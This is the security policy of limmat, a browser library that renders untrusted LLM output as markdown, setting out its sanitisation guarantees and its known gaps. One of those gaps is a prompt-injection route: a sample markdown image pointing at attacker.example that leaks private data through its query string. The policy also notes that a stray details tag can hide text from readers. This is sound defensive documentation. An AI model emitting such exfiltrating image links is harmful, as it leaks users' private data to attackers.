# Security policy

limmat renders untrusted text (LLM output) into the DOM, so security reports are welcome.

## Reporting

Report a vulnerability privately, not in a public issue:

- Use GitHub's private vulnerability reporting on the repository (Security tab, "Report a vulnerability"), or
- email contact@daanrosendal.com.

Include the markdown input, how it was split into chunks (or "one write"), the browser, and what you expected versus what happened.

## In scope

Any input that makes limmat create an element or attribute outside its documented DOM, run script, load a resource that the `images` option or the URL checks should have refused, navigate to a disallowed URL, throw, or hang the page. Wrong rendering that is still inert text is a normal bug, not a vulnerability.

## What limmat guarantees

- Text always goes through text nodes. Raw HTML in the input is shown as text, with one exception: a fixed list of formatting tags (`b`, `strong`, `i`, `em`, `u`, `s`, `del`, `ins`, `mark`, `small`, `kbd`, `sub`, `sup`, and `br`) written with no attributes becomes an element with no attributes. A tag with any attribute, and every other tag, stays text. Collapsible sections are the one block-level exception: `<details>` or `<details open>` alone on a line (or followed by `<summary>text</summary>`), an optional `<summary>text</summary>` line, and `</details>` become a `details` element (with only `open`) and a `summary` element. The `html` option can only narrow these lists, never extend them.
- Links must use an allowed protocol (`https`, `http`, `mailto`, `tel`, `irc`, `ircs`, and `xmpp` by default) or be a site path you approve, and must parse as a URL. Anything else is refused, including `//host`, backslashes, and whitespace, control, zero-width, bidi, and no-break characters, and the label renders as plain text. `javascript:`, `data:`, and `vbscript:` are refused even if you list them in `allowedProtocols`. Any other protocol you list is trusted, so add `file:`, `blob:`, or `intent:` only if your app needs them.
- External links get `target="_blank"` and `rel="noopener noreferrer"` unless you pass `externalLinksNewTab: false`, which adds neither.
- Images are on by default, and each `<img>` source passes the same checks as a link, limited to `https`, `http`, and site paths. `javascript:`, `data:`, `blob:`, and `file:` never load. Every image has `referrerpolicy="no-referrer"`, `loading="lazy"`, and `decoding="async"`, and only its `alt` text comes from the input.
- limmat works under a strict Content-Security-Policy such as `default-src 'none'; script-src 'self'; style-src 'self'`. It never uses inline scripts, `eval`, or a `style` attribute written as a string: table alignment and the Copy fallback use the CSSOM, which `style-src` does not block. A test guards this.
- limmat works on pages that enforce Trusted Types (`require-trusted-types-for 'script'`), because it never writes an HTML string into the DOM. A browser test renders every test document under that policy. The optional `limmat/highlight` adapter is not covered, because `@speed-highlight/core` builds HTML itself.
- `limmat/server` (`renderToString`) is the one path that writes HTML text. It builds the same elements as above in a small in-memory DOM and serializes them, escaping `&`, `<`, `>`, and no-break spaces in text and also `"` in attribute values. A tag or attribute name must be a plain name, or it throws. Tests check that the string equals what jsdom serializes for every test document, that it parses back to the same tree, and that the audit finds nothing forbidden in it. It applies no highlighting, so there is no third-party HTML in it. One difference from the DOM path: an aligned table cell carries `style="text-align: …"` as a string, which a strict `style-src` blocks (the table then shows unaligned), so allow `style-src-attr` for it or accept that.
- The code fence language becomes a class name only if it matches `[A-Za-z0-9_+#-]{1,20}`. The label shown in the code header drops control, bidi, and zero-width characters.
- Nesting is capped (about 12 block levels and 30 inline levels), link destinations are limited to 8192 characters, and each paragraph has a work budget proportional to its length for scanning them, so hostile input cannot overflow the stack. One very long block is re-rendered on every update, so a looping or hostile model can slow the tab. That cost is known and out of scope for a report.
- The `highlight` callback receives the `<code>` element and the raw language string from the fence (not sanitized, unlike the class name), and is trusted code. The bundled `limmat/highlight` adapter only passes names that match the same pattern, and `@speed-highlight/core` escapes its input, but it builds HTML itself, so it does not work under Trusted Types.

## What limmat does not guarantee by default

- **Images can leak data.** An image loads as soon as it renders, with no click. If a reply can contain private data and attacker-controlled input at the same time (prompt injection), a hostile model can emit `![](https://attacker.example/?q=<private data>)` and the browser sends the request. limmat cannot tell that from a normal image. To close it, pass `images: ['https://your-cdn.example']` or `images: false` to `createRenderer`, and set a Content-Security-Policy `img-src`. In scope for a report: any way to get an image to load that these options or the URL checks should have stopped. Out of scope: the default allowing an `https` image.

- **Collapsed sections can hide text.** A closed `<details>` hides its content from a reader until they open it, and a stray `<details>` line wraps the rest of a reply in one (with an attacker-chosen summary, if the text is untrusted). The text stays in the DOM and in the accessibility tree, and a section that never closes is opened when the message ends. If hidden text matters for your use case, pass an `html` array without `details`.

- **Math output is not checked.** `renderMath` is off unless you pass it. It hands each finished formula (text the model wrote) to your function, which builds elements with KaTeX, Temml, or MathJax. limmat gives it a box that is on the page, calls it only for closed formulas (at most 2000 characters each, 200 formulas and 20000 characters per message), and shows the tex as text if it throws or rejects. It does not inspect, time-limit, or sandbox what the function builds or loads. `limmat/katex` keeps KaTeX's `trust` off (with `trust`, a formula can make links, load images, and set ids and classes), bounds macros and sizes with `maxExpand` and `maxSize`, and draws through KaTeX's DOM path, which works under a strict `style-src` and Trusted Types (`renderToString` into `innerHTML` does not). MathJax can make links from `\href`, which skip `allowedProtocols`, so load its `safe` extension. Images and fonts a library loads are limited by your CSP (`img-src`, `font-src`), not by `images`. A formula that is slow to typeset is not interrupted. `limmat/server` never calls `renderMath`. See [docs/math.md](https://github.com/DaanRosendal/limmat/blob/master/docs/math.md).

limmat does not protect you from your own CSS or from what your `onLinkClick` does. `onLinkClick` runs on a click only, so a middle-click or "open in new tab" skips it: set link policy with `allowedProtocols` and `isInternalPath`, not there.

## Supported versions

The latest minor release.
